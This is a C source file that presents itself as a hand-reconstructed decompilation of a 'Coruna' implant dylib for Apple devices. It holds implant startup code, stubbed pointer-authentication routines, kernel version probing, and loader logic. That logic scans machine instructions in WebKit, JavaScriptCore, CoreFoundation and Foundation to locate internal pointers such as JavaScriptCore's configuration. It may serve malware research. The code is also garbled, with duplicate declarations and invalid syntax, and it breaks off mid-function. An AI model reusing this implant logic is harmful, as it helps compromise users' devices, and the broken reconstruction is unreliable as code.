/*
 * Coruna implant dylib (implant6dec) — hand-reconstructed native C
 *
 * Mach-O export _start: implant context, IO dispatch, dylib section resolve.
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}


typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



/* Implant runtime constants (from Mach-O image) */
static uint64_t k_implant_branch_mask;
static uint64_t k_implant_ctx_slot_primary;
static uint64_t k_implant_remote_arg_a = 0x0000000000000000ULL;
static uint64_t k_implant_remote_arg_b = 0x0000000000000000ULL;
static uint64_t k_implant_remote_dispatch = 0x0000000000000000ULL;
static uint64_t k_implant_insn_pattern_a = 0x0000010000000080ULL;
static uint64_t k_implant_insn_pattern_b = 0x0000002000000010ULL;
static uint64_t k_implant_insn_pattern_c = 0x0000000100000701ULL;
static uint64_t k_implant_reloc_tag_a = 0x0000020000000001ULL;
static uint64_t k_implant_reloc_tag_b = 0x0013000000000000ULL;
static uint64_t k_implant_reloc_tag_c = 0x0000000000000001ULL;
static uint64_t k_implant_reloc_tag_d = 0x0000000040000000ULL;
static uint32_t k_implant_float_const_001 = 0x3c23d70a;
static uint32_t k_implant_float_const_01 = 0x3dcccccd;
static uint64_t k_implant_float_const_pack = 0x3e4ccccd4e6e6b28ULL;
static uint64_t k_implant_map_flags_a = 0x0000002000000000ULL;
static uint64_t k_implant_map_flags_b = 0x0000000042000000ULL;
static uint64_t k_implant_macho_header_tag = 0x4847464544434241ULL;
static uint64_t k_implant_section_count_hint = 0x0000000000000004ULL;
static uint64_t k_implant_symbol_count_hint = 0x0000000000000012ULL;
static uint64_t k_implant_slot_a = 0x0000000000000000ULL;
static uint64_t k_implant_slot_b = 0x0000000000000000ULL;
static uint64_t k_implant_slot_c = 0x0000000000000000ULL;
static uint64_t k_implant_slot_d = 0x0000000000000000ULL;
static uint64_t k_implant_slot_e = 0x0000000000000000ULL;
static uint64_t k_implant_slot_f = 0x0000000000000000ULL;
static uint64_t k_implant_insn_pattern_d = 0xffc003ff9f000000ULL;
static uint64_t k_implant_insn_pattern_e = 0xf940021090000000ULL;
static uint64_t k_implant_insn_pattern_f = 0x0000000050000000ULL;
static uint64_t k_implant_insn_pattern_g = 0x0000000700000023ULL;
static uint64_t k_implant_insn_pattern_h = 0x0000001500000013ULL;
static uint64_t k_implant_insn_pattern_i = 0x0000000200000001ULL;
static uint64_t k_implant_insn_pattern_j = 0x0000000e00000011ULL;
static uint64_t k_implant_vtable_tag_a = 0x0000000000000001ULL;
static uint64_t k_implant_vtable_tag_b = 0x0000000000000003ULL;
static uint64_t k_implant_map_size_bias = 0x0000000000000005ULL;
static uint64_t k_implant_map_size_page = 0x0000000000000600ULL;
static uint64_t k_implant_import_slot_23 = 0x0000000000000023ULL;
static uint64_t k_implant_import_slot_24 = 0x0000000000000024ULL;
static uint64_t k_implant_import_slot_25 = 0x0000000000000025ULL;
static uint64_t k_implant_import_slot_26 = 0x0000000000000026ULL;
static uint64_t k_implant_import_slot_27 = 0x0000000000000027ULL;
static uint64_t k_implant_import_slot_28 = 0x0000000000000028ULL;
static uint64_t k_implant_import_slot_29 = 0x0000000000000029ULL;
static uint64_t k_implant_import_slot_2a = 0x000000000000002aULL;
static uint64_t k_implant_import_slot_2b = 0x000000000000002bULL;
static uint64_t k_implant_import_slot_2c = 0x000000000000002cULL;
static uint64_t k_implant_import_slot_2d = 0x000000000000002dULL;
static uint64_t k_implant_import_slot_2e = 0x000000000000002eULL;
static uint64_t k_implant_import_slot_2f = 0x000000000000002fULL;
static uint64_t k_implant_import_slot_30 = 0x0000000000000030ULL;
static uint64_t k_implant_import_slot_31 = 0x0000000000000031ULL;
static void *k_implant_nsconcretestackblock_slot = (void *)0x400800000000004dULL;
static void *k_implant_stack_chk_guard_slot = (void *)0x400800000000004eULL;
static void *k_implant_stderrp_slot = (void *)0x400800000000004fULL;
static void *k_implant_mach_task_self_slot = (void *)0x4010000000000051ULL;
static void *PTR_s__OBJC_CLASS___DataClassMigrator_000147a0 = (void *)0x0018000000013695ULL;
static void *PTR_s__SSLRecordReadInternal_000147c0 = (void *)0x00180000000136b5ULL;
static void *PTR_s__SSLRecordReadInternal_00014800 = (void *)0x00180000000136b5ULL;
static void *PTR_s__System_Library_Frameworks_Found_00014678 = (void *)0x0008000000012c77ULL;
static void *PTR_s__System_Library_Frameworks_Found_00014778 = (void *)0x0008000000012c77ULL;
static void *PTR_s__System_Library_Frameworks_Found_00014818 = (void *)0x0008000000012c77ULL;
static void *PTR_s__System_Library_Frameworks_Secur_000147b8 = (void *)0x00080000000132c1ULL;
static void *PTR_s__System_Library_Frameworks_Secur_000147d8 = (void *)0x00080000000132c1ULL;
static void *PTR_s__System_Library_Frameworks_Secur_000147f8 = (void *)0x00080000000132c1ULL;
static void *PTR_s__System_Library_PrivateFramework_00014758 = (void *)0x0008000000013594ULL;
static void *PTR_s__System_Library_PrivateFramework_00014798 = (void *)0x000800000001364dULL;
static void *PTR_s__System_Library_PrivateFramework_00014838 = (void *)0x000800000001364dULL;
static void *PTR_s___AUTH_00014928 = (void *)0x0008000000013ec6ULL;
static void *PTR_s___AUTH_CONST_00014920 = (void *)0x0008000000013eb9ULL;
static void *PTR_s___DATA_00014930 = (void *)0x0008000000013843ULL;
static void *PTR_s___DATA_CONST_00014938 = (void *)0x0008000000013ecdULL;
static void *PTR_s___DATA_DIRTY_00014940 = (void *)0x0018000000013edaULL;
static void *PTR_s___ZGVZN7WebCore24FloatingPointEn_00014760 = (void *)0x00180000000135d0ULL;
static void *PTR_s_____NSExtensionContextInternalCl_00014820 = (void *)0x00180000000136f8ULL;
static void *PTR_s_____NSExtensionContextVendorClas_00014680 = (void *)0x002000000001348eULL;
static void *PTR_s__deviceStateChanged__000146a0 = (void *)0x00200000000134bdULL;
static void *PTR_s__rng_00014740 = (void *)0x001800000001358fULL;
static void *PTR_s__softLinkEXGetExtensionContextIn_00014780 = (void *)0x0018000000013621ULL;
static void *PTR_s__tls_handshake_init_pending_ciph_000147e0 = (void *)0x00180000000136ccULL;
static void *PTR_s__usr_lib_system_libsystem_c_dyli_00014738 = (void *)0x000800000001356dULL;
static void *PTR_s_dataClassMigratorForBundleAtPath_00014840 = (void *)0x0020000000013729ULL;
static void *PTR_s_performSelectorOnMainThread_with_00014700 = (void *)0x002000000001350bULL;
static void *PTR_s_setObject_forKeyedSubscript__00014720 = (void *)0x0018000000013541ULL;
static void *PTR_s_stringByEvaluatingJavaScriptFrom_000146c0 = (void *)0x00200000000134d2ULL;
static void *PTR_s_valueForKeyPath__000146e0 = (void *)0x00200000000134faULL;
void _start(long handle)
{
  uint64_t u;
  uint32_t scratch;
  uint64_t bootargs;
  long thread_attr [12];
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    thread_attr[0] = 0;
    u = coruna_implant6dec_via_ctx_free_11534(thread_attr,handle);
    if ((int)u == 0) {
      bootargs = 0;
      scratch = 0;
      coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(thread_attr[0] + 0x18),thread_attr[0],0x70003,&bootargs,&scratch);
    }
  }
  if (*(long *)k_implant_stack_chk_guard_slot != host_info) {
    ___stack_chk_fail(u);
  }
  return;
}
void coruna_call_sysctlbyname_f8f8_stub(void)
{
  coruna_call_sysctlbyname_f8f8();
  return;
}





void coruna_pacia(void)
{
  return;
}





void coruna_pacda(void)
{
  return;
}





void coruna_pacib(void)
{
  return;
}





void coruna_pacdb(void)
{
  return;
}
uint64_t coruna_return_zero_41a8(void)
{
  return 0;
}





void coruna_implant_indirect_call0(void (*indirect_target)
{
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_b(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[12];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_c(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[4];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_2(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}
void coruna_pacia_2(void)
{
  return;
}
void coruna_implant6dec_via_memcpy_ba98(uint64_t val)
{
  uint64_t u;
  uint8_t *ptr;
  uint64_t size;
  void *ptr;
  long handle;
  uint64_t *scratch;
  uint64_t *bootargs;
  uint64_t *thread_attr;
  uint64_t *host_info;
  uint64_t *serial_buf;
  uint64_t *action;
  void *block_ctx;
  void *stack_guard;
  void *sa_saved;
  void *sa_new;
  void *path_buf;
  void *tmp_buf;
  uint32_t region[2];
  uint8_t plist[24];
  uint32_t url_buf;
  uint8_t json_buf[24];
  uint32_t frame;
  uint8_t work[24];
  uint32_t cache;
  long cache_20 [4];
  
  cache_20[3] = *(long *)k_implant_stack_chk_guard_slot;
  sa_new = operator_new(0x1c0);
  ptr = (void *)((long)sa_new + 0x1c0);
  tmp_buf = ptr;
  _memcpy(sa_new,&k_implant_section_count_hint,0x1c0);
  region[0] = 0;
  path_buf = ptr;
  coruna_memcpy_ba98(plist,&sa_new);
  block_ctx = operator_new(0x220);
  ptr = (void *)((long)block_ctx + 0x220);
  sa_saved = ptr;
  _memcpy(block_ctx,&k_implant_symbol_count_hint,0x220);
  url_buf = 1;
  stack_guard = ptr;
  coruna_memcpy_ba98(json_buf,&block_ctx);
  host_info = operator_new(0x20);
  size = k_implant_rodata_word_00014688;
  ptr = PTR_s_____NSExtensionContextVendorClas_00014680;
  u = k_implant_import_slot_23;
  serial_buf = host_info + 4;
  host_info[1] = PTR_s__System_Library_Frameworks_Found_00014678;
  *host_info = u;
  host_info[3] = size;
  host_info[2] = ptr;
  frame = 2;
  action = serial_buf;
  coruna_memcpy_ba98(work,&host_info);
  scratch = operator_new(0xa0);
  size = k_implant_rodata_word_00014708;
  ptr = PTR_s_performSelectorOnMainThread_with_00014700;
  u = k_implant_import_slot_27;
  bootargs = scratch + 0x14;
  scratch[0xd] = k_implant_rodata_word_000146f8;
  scratch[0xc] = u;
  scratch[0xf] = size;
  scratch[0xe] = ptr;
  size = k_implant_rodata_word_00014728;
  ptr = PTR_s_setObject_forKeyedSubscript__00014720;
  u = k_implant_import_slot_28;
  scratch[0x11] = k_implant_rodata_word_00014718;
  scratch[0x10] = u;
  scratch[0x13] = size;
  scratch[0x12] = ptr;
  size = k_implant_rodata_word_000146c8;
  ptr = PTR_s_stringByEvaluatingJavaScriptFrom_000146c0;
  u = k_implant_import_slot_25;
  scratch[5] = k_implant_rodata_word_000146b8;
  scratch[4] = u;
  scratch[7] = size;
  scratch[6] = ptr;
  size = k_implant_rodata_word_000146e8;
  ptr = PTR_s_valueForKeyPath__000146e0;
  u = k_implant_import_slot_26;
  scratch[9] = k_implant_rodata_word_000146d8;
  scratch[8] = u;
  scratch[0xb] = size;
  scratch[10] = ptr;
  size = k_implant_rodata_word_000146a8;
  ptr = PTR_s__deviceStateChanged__000146a0;
  u = k_implant_import_slot_24;
  scratch[1] = k_implant_rodata_word_00014698;
  *scratch = u;
  scratch[3] = size;
  scratch[2] = ptr;
  cache = 3;
  thread_attr = bootargs;
  coruna_memcpy_ba98(cache_20,&scratch);
  coruna_implant6dec_via_cat(val,region,4);
  handle = 0;
  do {
    ptr = *(void **)((long)cache_20 + handle);
    if (ptr != (void *)0x0) {
      *(void **)((long)cache_20 + handle + 8) = ptr;
      operator_delete(ptr);
    }
    handle = handle + -0x20;
  } while (handle != -0x80);
  if (scratch != (uint64_t *)0x0) {
    bootargs = scratch;
    operator_delete(scratch);
  }
  if (host_info != (uint64_t *)0x0) {
    serial_buf = host_info;
    operator_delete(host_info);
  }
  if (block_ctx != (void *)0x0) {
    stack_guard = block_ctx;
    operator_delete(block_ctx);
  }
  if (sa_new != (void *)0x0) {
    path_buf = sa_new;
    operator_delete(sa_new);
  }
  if (*(long *)k_implant_stack_chk_guard_slot != cache_20[3]) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_implant6dec_via_cat(long *handle,uint *size,long addr_2)
{
  long *ptr;
  uint *ptr;
  uint u;
  unsigned long size;
  unsigned long version;
  long handle;
  long *buf;
  long *str;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  unsigned long unaff_x27;
  uint16_t type_id;
  uint64_t type_id_8;
  
  if (addr_2 != 0) {
    ptr = size + addr_2 * 8;
    ptr = handle + 2;
    do {
      u = *size;
      kind = (unsigned long)u;
      tag = handle[1];
      if (tag == 0) {
fail:
        buf = operator_new(0x30);
        *(uint *)(buf + 2) = u;
        coruna_memcpy_ba98(buf + 3,size + 2);
        *buf = 0;
        buf[1] = kind;
        if (*(float *)(handle + 4) * (float)tag < (float)(handle[3] + 1) || tag == 0) {
          version = 1;
          if (2 < tag) {
            version = (unsigned long)((tag & tag - 1) != 0);
          }
          version = version | tag << 1;
          tag = (unsigned long)((float)(handle[3] + 1) / *(float *)(handle + 4));
          if (tag <= version) {
            tag = version;
          }
          coruna_implant6dec_via_cat_3(handle,tag);
          tag = handle[1];
          if ((tag & tag - 1) == 0) {
            unaff_x27 = (unsigned long)((int)tag - 1U & u);
          }
          else {
            unaff_x27 = kind;
            if (tag <= kind) {
              version = 0;
              if (tag != 0) {
                version = kind / tag;
              }
              unaff_x27 = kind - version * tag;
            }
          }
        }
        handle = *handle;
        str = *(long **)(handle + unaff_x27 * 8);
        if (str == (long *)0x0) {
          *buf = *ptr;
          *ptr = (long)buf;
          *(long **)(handle + unaff_x27 * 8) = ptr;
          if (*buf != 0) {
            kind = *(unsigned long *)(*buf + 8);
            if ((tag & tag - 1) == 0) {
              kind = kind & tag - 1;
            }
            else if (tag <= kind) {
              version = 0;
              if (tag != 0) {
                version = kind / tag;
              }
              kind = kind - version * tag;
            }
            *(long **)(*handle + kind * 8) = buf;
          }
        }
        else {
          *buf = *str;
          *str = (long)buf;
        }
        handle[3] = handle[3] + 1;
      }
      else {
        type_id_8 = coruna_cat(POPCOUNT((char)(tag >> 0x38)),
                          coruna_cat(POPCOUNT((char)(tag >> 0x30)),
                                   coruna_cat(POPCOUNT((char)(tag >> 0x28)),
                                            coruna_u64_pack14((POPCOUNT((char)(tag >> 0x20))), (coruna_cat(POPCOUNT((char))(tag >> 0x18)),
                                                              coruna_cat(POPCOUNT((char)(tag >>
                                                                                      0x10)),
                                                                       coruna_cat(POPCOUNT((char)(
                                                  tag >> 8)),POPCOUNT((char)tag))))))));
        type_id = NEON_uaddlv(type_id_8,1);
        version = coruna_cat((int6)((unsigned long)type_id_8 >> 0x10),type_id) & 0xffffffff;
        if (version < 2) {
          unaff_x27 = (unsigned long)((int)tag - 1U & u);
        }
        else {
          unaff_x27 = kind;
          if (tag <= kind) {
            port = 0;
            if (tag != 0) {
              port = kind / tag;
            }
            unaff_x27 = kind - port * tag;
          }
        }
        buf = *(long **)(*handle + unaff_x27 * 8);
        if (buf == (long *)0x0) goto fail;
        do {
          buf = (long *)*buf;
          if (buf == (long *)0x0) goto fail;
          port = buf[1];
          if (port != kind) {
            if (version < 2) {
              port = port & tag - 1;
            }
            else if (tag <= port) {
              size = 0;
              if (tag != 0) {
                size = port / tag;
              }
              port = port - size * tag;
            }
            if (port != unaff_x27) goto fail;
          }
        } while (*(uint *)(buf + 2) != u);
      }
      size = size + 8;
    } while (size != ptr);
  }
  return;
}
void coruna_implant6dec_residual_79(uint64_t *val)
{
  uint64_t u;
  uint64_t size;
  uint64_t version;
  uint64_t *ptr;
  
  ptr = operator_new(0x40);
  version = k_implant_rodata_word_00012ae8;
  size = k_implant_insn_pattern_h;
  u = k_implant_insn_pattern_g;
  ptr[1] = k_implant_rodata_word_00012ad8;
  *ptr = u;
  ptr[3] = version;
  ptr[2] = size;
  version = k_implant_rodata_word_00012b08;
  size = k_implant_insn_pattern_j;
  u = k_implant_insn_pattern_i;
  ptr[5] = k_implant_rodata_word_00012af8;
  ptr[4] = u;
  ptr[7] = version;
  ptr[6] = size;
  coruna_implant6dec_via_abort(val,*val,ptr,ptr + 8);
  operator_delete(ptr);
  return;
}
void coruna_implant6dec_via_abort(long *handle,void *ctx,uint32_t *size,uint32_t *flags_2)
{
  unsigned long u;
  uint32_t *ptr;
  size_t ls3;
  uint32_t *buf;
  long handle;
  uint32_t *str;
  unsigned long size;
  uint32_t *copy;
  long addr;
  long off;
  void *scratch;
  uint32_t *bootargs;
  uint32_t *thread_attr;
  void *host_info;
  long *serial_buf;
  
  if (0 < (long)flags_2 - (long)size) {
    addr = (long)flags_2 - (long)size >> 2;
    buf = (uint32_t *)handle[1];
    if (handle[2] - (long)buf >> 2 < addr) {
      off = *handle;
      u = addr + ((long)buf - off >> 2);
      if (u >> 0x3e != 0) {
        coruna_abort_87cc();
fail:
        coruna_abort();
      }
      serial_buf = handle + 2;
      handle = handle[2] - off;
      size = handle >> 1;
      if (u <= size) {
        u = size;
      }
      if (0x1ffffffffffffffe < (unsigned long)(handle >> 2)) {
        u = 0x3fffffffffffffff;
      }
      if (u == 0) {
        scratch = (void *)0x0;
      }
      else {
        if (u >> 0x3e != 0) goto fail;
        scratch = operator_new(u << 2);
      }
      bootargs = (uint32_t *)((long)scratch + ((long)ctx - off >> 2) * 4);
      host_info = (void *)((long)scratch + u * 4);
      thread_attr = bootargs + addr;
      addr = addr << 2;
      buf = bootargs;
      do {
        *buf = *size;
        addr = addr + -4;
        buf = buf + 1;
        size = size + 1;
      } while (addr != 0);
      coruna_implant6dec_residual_89(handle,&scratch,ctx);
      if ((long)thread_attr - (long)bootargs != 0) {
        thread_attr = thread_attr + (((long)thread_attr - (long)bootargs) - 4U >> 2 ^ 0xffffffffffffffff);
      }
      if (scratch != (void *)0x0) {
        operator_delete(scratch);
      }
    }
    else {
      off = (long)buf - (long)ctx >> 2;
      str = buf;
      if (off < addr) {
        for (copy = size + off; copy != flags_2; copy = copy + 1) {
          *str = *copy;
          str = str + 1;
        }
        handle[1] = (long)str;
        flags_2 = size + off;
        if ((long)buf - (long)ctx < 1) {
          return;
        }
      }
      ls3 = (long)str - (long)((long)ctx + addr * 4);
      ptr = str;
      for (copy = str + -addr; copy < buf; copy = copy + 1) {
        *ptr = *copy;
        ptr = ptr + 1;
      }
      handle[1] = (long)ptr;
      if (ls3 != 0) {
        _memmove(str + -((long)ls3 >> 2),ctx,ls3);
      }
      if ((long)flags_2 - (long)size != 0) {
        _memmove(ctx,size,(long)flags_2 - (long)size);
      }
    }
  }
  return;
}
void coruna_sysctlbyname(void)
{
  int err;
  char *ptr;
  size_t scratch;
  char bootargs [40];
  long thread_attr;
  
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  bootargs[8] = '\0';
  bootargs[9] = '\0';
  bootargs[10] = '\0';
  bootargs[0xb] = '\0';
  bootargs[0xc] = '\0';
  bootargs[0xd] = '\0';
  bootargs[0xe] = '\0';
  bootargs[0xf] = '\0';
  bootargs[0] = '\0';
  bootargs[1] = '\0';
  bootargs[2] = '\0';
  bootargs[3] = '\0';
  bootargs[4] = '\0';
  bootargs[5] = '\0';
  bootargs[6] = '\0';
  bootargs[7] = '\0';
  bootargs[0x18] = '\0';
  bootargs[0x19] = '\0';
  bootargs[0x1a] = '\0';
  bootargs[0x1b] = '\0';
  bootargs[0x1c] = '\0';
  bootargs[0x1d] = '\0';
  bootargs[0x1e] = '\0';
  bootargs[0x1f] = '\0';
  bootargs[0x10] = '\0';
  bootargs[0x11] = '\0';
  bootargs[0x12] = '\0';
  bootargs[0x13] = '\0';
  bootargs[0x14] = '\0';
  bootargs[0x15] = '\0';
  bootargs[0x16] = '\0';
  bootargs[0x17] = '\0';
  scratch = 0x20;
  err = _sysctlbyname("kern.osversion",bootargs,&scratch,(void *)0x0,0);
  if (err == -1) {
    ptr = (char *)0x0;
  }
  else {
    ptr = _strdup(bootargs);
  }
  if (*(long *)k_implant_stack_chk_guard_slot != thread_attr) {
    ___stack_chk_fail(ptr);
  }
  return;
}
void coruna_load_javascriptcore(long *handle,uint64_t val)
{
  unsigned long u;
  uint size;
  uint version;
  uint port;
  bool err;
  int err;
  uint64_t *ptr;
  char *ptr;
  uint64_t tag;
  uint *buf;
  long handle;
  uint64_t *str;
  uint64_t *copy;
  void *ptr;
  long addr;
  long off;
  uint32_t *data;
  unsigned long kind;
  uint32_t *obj;
  void *buf;
  uint type_id;
  uint32_t *block;
  size_t ls23;
  uint64_t *entry;
  long *str;
  long base;
  uint64_t type_id_8;
  int status;
  uint32_t scratch;
  uint32_t scratch;
  char *bootargs;
  char *thread_attr;
  long host_info;
  uint32_t serial_buf;
  uint32_t bootargs;
  char *action;
  char *block_ctx;
  long stack_guard;
  uint32_t sa_saved;
  uint32_t thread_attr;
  uint64_t host_info;
  uint64_t sa_new;
  uint64_t serial_buf;
  uint32_t path_buf;
  uint32_t action;
  char *tmp_buf;
  uint64_t region;
  long plist;
  long url_buf;
  
  url_buf = *(long *)k_implant_stack_chk_guard_slot;
  ptr = operator_new(0xa0);
  ptr[4] = 0;
  ptr[3] = 0;
  ptr[8] = 0;
  ptr[7] = 0;
  copy = ptr + 5;
  ptr[6] = 0;
  *copy = 0;
  *(uint32_t *)(ptr + 9) = 0x3f800000;
  ptr[0xd] = 0;
  ptr[0xc] = 0;
  entry = ptr + 10;
  ptr[0xb] = 0;
  *entry = 0;
  *(uint32_t *)(ptr + 0xe) = 0x3f800000;
  str = ptr + 0xf;
  ptr[0x10] = 0;
  *str = 0;
  ptr[0x12] = 0;
  ptr[0x11] = 0;
  *(uint32_t *)(ptr + 0x13) = 0x3f800000;
  *ptr = val;
  ptr = _strdup((char *)*handle);
  ptr[2] = ptr;
  tag = coruna_sysctlbyname();
  ptr[1] = tag;
  coruna_implant6dec_via_memcpy_ba98_2(entry);
  coruna_implant6dec_via_memcpy_ba98(str);
  err = coruna_implant6dec_residual_81(entry,copy);
  if ((err == 0) || (err = coruna_implant6dec_residual_81(str,copy), err == 0)) {
    err = false;
  }
  else {
    base = 0xffff1102888122;
    buf = (uint *)coruna_dlclose_1041c("/System/Library/Frameworks/WebKit.framework/WebKit",
                                   "_WebContentServiceInitializer");
    handle = coruna_dlclose_1041c("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore",
                          "_g_config");
    plist = 0xffff1102888122;
    if ((buf != (uint *)0x0) && (plist = 0xffff1102888122, handle != 0)) {
      type_id = 0;
      port = *buf;
      do {
        version = buf[1];
        plist = 0xffff1102888122;
        if ((port & 0x9f000000) == 0x90000000) {
          size = buf[4];
          plist = 0xffff1102888122;
          if ((version & 0xffc00000) == 0x91000000 && (size & 0xff000000) == 0x35000000) {
            err = _strcmp((char *)(((unsigned long)(port >> 0x11 & 0x3000) |
                                     (unsigned long)(port >> 5 & 0x7ffff) << 0xe) +
                                     ((unsigned long)(buf + 1) & 0xfffffffffffff000) |
                                    (unsigned long)(version >> 10) & 0xfff),"enable-shared-array-buffer");
            plist = 0xffff1102888122;
            if (err == 0) {
              off = 0;
              addr = 0xffff1102888122;
              do {
                port = *(uint *)((long)(buf + 1) + off + ((unsigned long)(size >> 5) & 0x7ffff) * 4
                                 );
                plist = handle + ((unsigned long)(port >> 10) & 0xfff);
                if (port >> 0x16 != 0xe4) {
                  plist = addr;
                }
                off = off + 4;
                addr = plist;
              } while (off != 0x28);
            }
          }
        }
      } while ((type_id < 0x31) &&
              (type_id = type_id + 1, buf = buf + 1, port = version,
              plist == 0xffff1102888122));
    }
    path_buf = 3;
    tmp_buf = "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore";
    region = 0;
    str = (uint64_t *)coruna_implant6dec_via_cat_2(copy,&path_buf);
    str[1] = tmp_buf;
    *str = coruna_u64_pack((action), (path_buf));
    str[3] = plist;
    str[2] = region;
    sa_saved = 1;
    host_info = 0;
    sa_new = 0;
    serial_buf = 1;
    str = (uint64_t *)coruna_implant6dec_via_cat_2(copy,&sa_saved);
    str[1] = host_info;
    *str = coruna_u64_pack((thread_attr), (sa_saved));
    str[3] = serial_buf;
    str[2] = sa_new;
    handle = coruna_dlclose_1041c("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation",
                          "_CFRunLoopObserverCreateWithHandler");
    stack_guard = 0xffff1102888122;
    if (handle != 0xffff1102888122) {
      type_id_8 = *(uint64_t *)(handle + 0x3c);
      tag = *(uint64_t *)(handle + 0x34U);
      err = coruna_cat((byte)((unsigned long)tag >> 0x18) & (byte)((unsigned long)k_implant_insn_pattern_d >> 0x18),
                       coruna_cat((byte)((unsigned long)tag >> 0x10) & (byte)((unsigned long)k_implant_insn_pattern_d >> 0x10),
                                coruna_cat((byte)((unsigned long)tag >> 8) &
                                         (byte)((unsigned long)k_implant_insn_pattern_d >> 8),
                                         (byte)tag & (byte)k_implant_insn_pattern_d)));
      status = coruna_cat((byte)((unsigned long)type_id_8 >> 0x18) & (byte)((unsigned long)k_implant_rodata_word_00012aa8 >> 0x18),
                        coruna_cat((byte)((unsigned long)type_id_8 >> 0x10) &
                                 (byte)((unsigned long)k_implant_rodata_word_00012aa8 >> 0x10),
                                 coruna_cat((byte)((unsigned long)type_id_8 >> 8) &
                                          (byte)((unsigned long)k_implant_rodata_word_00012aa8 >> 8),
                                          (byte)type_id_8 & (byte)k_implant_rodata_word_00012aa8)));
      stack_guard = 0xffff1102888122;
      if (((!(bool)(~(err == (int)k_implant_insn_pattern_e) & 1) &&
           !(bool)(~((int)(coruna_cat((byte)((unsigned long)tag >> 0x38) &
                                    (byte)((unsigned long)k_implant_insn_pattern_d >> 0x38),
                                    coruna_cat((byte)((unsigned long)tag >> 0x30) &
                                             (byte)((unsigned long)k_implant_insn_pattern_d >> 0x30),
                                             coruna_cat((byte)((unsigned long)tag >> 0x28) &
                                                      (byte)((unsigned long)k_implant_insn_pattern_d >> 0x28),
                                                      coruna_u64_pack14(((byte)((unsigned long)tag >> 0x20) &
                                                               (byte)((unsigned long)k_implant_insn_pattern_d >> 0x20)), (err))))) >> 0x20) ==
                    (int)((unsigned long)k_implant_insn_pattern_e >> 0x20)) & 1)) &&
          !(bool)(~(status == (int)k_implant_rodata_word_00012ab8) & 1)) &&
          !(bool)(~((int)(coruna_cat((byte)((unsigned long)type_id_8 >> 0x38) &
                                   (byte)((unsigned long)k_implant_rodata_word_00012aa8 >> 0x38),
                                   coruna_cat((byte)((unsigned long)type_id_8 >> 0x30) &
                                            (byte)((unsigned long)k_implant_rodata_word_00012aa8 >> 0x30),
                                            coruna_cat((byte)((unsigned long)type_id_8 >> 0x28) &
                                                     (byte)((unsigned long)k_implant_rodata_word_00012aa8 >> 0x28),
                                                     coruna_u64_pack14(((byte)((unsigned long)type_id_8 >> 0x20) &
                                                              (byte)((unsigned long)k_implant_rodata_word_00012aa8 >> 0x20)), (status))))) >> 0x20) ==
                   (int)((unsigned long)k_implant_rodata_word_00012ab8 >> 0x20)) & 1)) {
        stack_guard = (handle + 0x34U & 0xfffffffffffff000) + (unsigned long)((uint)tag >> 0x11 & 0x3000) +
                     (unsigned long)((uint)tag >> 5 & 0x7ffff) * 0x4000 +
                     (unsigned long)((uint)((unsigned long)tag >> 0x27) & 0x7ff8);
      }
    }
    serial_buf = 2;
    action = "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation";
    block_ctx = "_CFRunLoopObserverCreateWithHandler";
    str = (uint64_t *)coruna_implant6dec_via_cat_2(copy,&serial_buf);
    str[1] = action;
    *str = coruna_u64_pack((bootargs), (serial_buf));
    str[3] = stack_guard;
    str[2] = block_ctx;
    handle = coruna_dlclose_1041c("/System/Library/Frameworks/Foundation.framework/Foundation",
                          "____NSExtensionContextVendorClass_block_invoke");
    if (handle != 0xffff1102888122) {
      type_id = *(uint *)(handle + 0x24);
      if (((((type_id & 0x9f000000) == 0x90000000) &&
           ((*(uint *)(handle + 0x28) & 0xffc003ff) == 0xf9000100)) &&
          ((*(uint *)(handle + 0x2c) & 0xa8c17bfd) == 0xa8c17bfd)) &&
         (*(int *)(handle + 0x30) == -0x29a0f001)) {
        base = ((unsigned long)(handle + 0x24) & 0xfffffffffffff000) + (unsigned long)(type_id >> 0x11 & 0x3000) +
                 ((unsigned long)(type_id >> 5) & 0x7ffff) * 0x4000 +
                 ((unsigned long)(*(uint *)(handle + 0x28) >> 7) & 0x7ff8);
      }
    }
    scratch = 0;
    bootargs = "/System/Library/Frameworks/Foundation.framework/Foundation";
    thread_attr = "____NSExtensionContextVendorClass_block_invoke";
    host_info = base;
    copy = (uint64_t *)coruna_implant6dec_via_cat_2(copy,&scratch);
    copy[1] = bootargs;
